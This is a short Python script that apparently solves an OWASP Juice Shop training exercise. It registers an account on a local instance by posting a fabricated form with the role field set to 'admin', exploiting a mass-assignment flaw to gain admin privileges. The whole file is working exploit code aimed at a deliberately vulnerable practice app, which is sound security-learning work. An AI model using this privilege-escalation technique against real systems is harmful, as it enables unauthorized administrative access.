# Create a new Juice Shop account with role improperly
# elevated to admin via html form fabrication

import requests
import datetime
from random import randint

form_endpoint = "http://localhost:3000/api/users"   # Found via Wireshark

account_params = {
    "email": "test{0}@test.com".format(randint(0, 1000)),
    "password": "password",
    "passwordRepeat": "password",
    "securityQuestion": {
        "id": 1,
        "question": "Your eldest sibling name?",
        "createdAt": datetime.datetime.now(),
        "updatedAt": datetime.datetime.now(),
    },
    "securityAnswer": "answer",
    "role": "admin"     # This can be modified client-side. Oops...
}


def create_account():
    """Generate a new Juice Shop account using params from data"""
    response = requests.post(form_endpoint, data=account_params)
    return response


if __name__ == '__main__':
    response = create_account()
    print("Response:", response.status_code, "--", response.text)
